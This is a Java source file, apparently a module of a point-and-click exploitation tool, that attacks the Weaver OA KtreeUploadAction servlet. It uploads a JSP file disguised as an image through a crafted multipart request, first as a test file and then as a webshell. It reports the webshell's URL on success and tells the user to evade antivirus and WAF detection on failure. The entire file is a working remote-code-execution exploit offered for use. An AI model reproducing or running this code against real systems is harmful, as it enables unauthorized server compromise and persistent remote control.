package exp.oa.weaveroa;

import core.Exploitlnterface;

import java.util.HashMap;

import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.shell;

public class weaveroa_KtreeUploadAction implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea) {
        return this.att(url, textArea);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return shell(url, textArea);
    }

    private Boolean att(String url, TextArea textArea) {
        String payload = "----------1638451160\r\n" +
                "Content-Disposition: form-data; name=\"test\"; filename=\"test.jsp\"\r\n" +
                "Content-Type: image/jpeg\r\n" +
                "\r\n" +
                shell.readFile(shell.Testpath) + "\r\n" +
                "----------1638451160--";
        HashMap<String, String> head = new HashMap<>();
        head.put("Content-Type", "multipart/form-data; boundary=--------1638451160");
        Response post = HttpTools.post(url + "/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image", payload, head, "utf-8");
        if (post.getCode() == 200 && post.getText().contains("SUCCESS")) {
            String[] split = post.getText().split("'url':'");
            String replace = split[1].replace("','title':'','state':'SUCCESS'}", "");
            Response response = HttpTools.get(url + replace, new HashMap<String, String>(), "utf-8");
            if (response.getCode() == 200 && response.getText().contains(shell.test_payload)) {
                Platform.runLater(() -> {
                    textArea.appendText("\n 漏洞存在 测试文件写入成功\n " + url + replace);
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n weaveroa_KtreeUploadAction-RCE-漏洞不存在 (出现误报请联系作者)");
                });
                return false;
            }

        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n weaveroa_KtreeUploadAction-RCE-漏洞不存在 (出现误报请联系作者)");
            });
            return false;
        }
    }

    private Boolean shell(String url, TextArea textArea) {
        String payload = "----------1638451160\r\n" +
                "Content-Disposition: form-data; name=\"test\"; filename=\"test.jsp\"\r\n" +
                "Content-Type: image/jpeg\r\n" +
                "\r\n" +
                shell.readFile(shell.Jsppath) + "\r\n" +
                "----------1638451160--";
        HashMap<String, String> head = new HashMap<>();
        head.put("Content-Type", "multipart/form-data; boundary=--------1638451160");
        Response post = HttpTools.post(url + "/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image", payload, head, "utf-8");
        if (post.getCode() == 200 && post.getText().contains("SUCCESS")) {
            String[] split = post.getText().split("'url':'");
            String replace = split[1].replace("','title':'','state':'SUCCESS'}", "");
            Response response = HttpTools.get(url + replace, new HashMap<String, String>(), "utf-8");
            if (response.getCode() == 200 && response.getText().contains(shell.test_payload)) {
                Platform.runLater(() -> {
                    textArea.appendText("\n 漏洞存在 webshell文件写入成功\n " + url + replace);
                });
                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n shell被查杀！！ 请自行免杀！！");
                });
                return false;
            }

        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n waf拦截！！请自行免杀！！");
            });
            return false;
        }
    }

}
